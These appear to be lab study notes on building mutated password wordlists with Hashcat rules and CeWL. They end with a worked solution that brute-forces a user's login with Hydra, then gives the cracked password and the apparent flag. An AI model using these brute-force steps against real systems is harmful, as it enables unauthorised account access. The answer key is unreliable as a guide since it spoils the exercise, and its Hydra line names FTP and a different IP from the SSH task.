
> [! Hint ]
>[Hashcat](https://hashcat.net/wiki/doku.php?id=rule_based_attack) can be used to create combinations of words based on custom rule sets

The below table is a summary of some of the rules:

|**Function**|**Description**|
|---|---|
|`:`|Do nothing.|
|`l`|Lowercase all letters.|
|`u`|Uppercase all letters.|
|`c`|Capitalize the first letter and lowercase others.|
|`sXY`|Replace all instances of X with Y.|
|`$!`|Add the exclamation character at the end.|

#### Generating Rule-based Wordlists

```go
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

#### Local Hashcat Rules

```go
ls /usr/share/hashcat/rules/
```
```shell-session
best64.rule                  specific.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
generated2.rule              T0XlC.rule
generated.rule               T0XlCv1.rule
hybrid                       toggles1.rule
Incisive-leetspeak.rule      toggles2.rule
InsidePro-HashManager.rule   toggles3.rule
InsidePro-PasswordsPro.rule  toggles4.rule
leetspeak.rule               toggles5.rule
oscommerce.rule              unix-ninja-leetspeak.rule
rockyou-30000.rule
```


#### Generating Wordlists with CeWL

>[! Hint] 
> [CeWL](https://github.com/digininja/CeWL) can be used to scan websites to create custom wordlists. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password


### Question

IP
```go
10.129.111.37
```

Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.


Create a custom rule file
```go
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

Create mutated words via Hashcat
```go
sudo hashcat --force /usr/share/wordlists/password.list -r custom_rule --stdout | sort -u > mut_passwds
```


Brute force SSH via Hydra
```go
hydra -l sam -P mut_passwds ftp://10.129.94.26 -t 64
```

```go
ssh sam@10.129.94.26
```

Password found
```go
B@tm@n2022!
```

```go
superdba
```
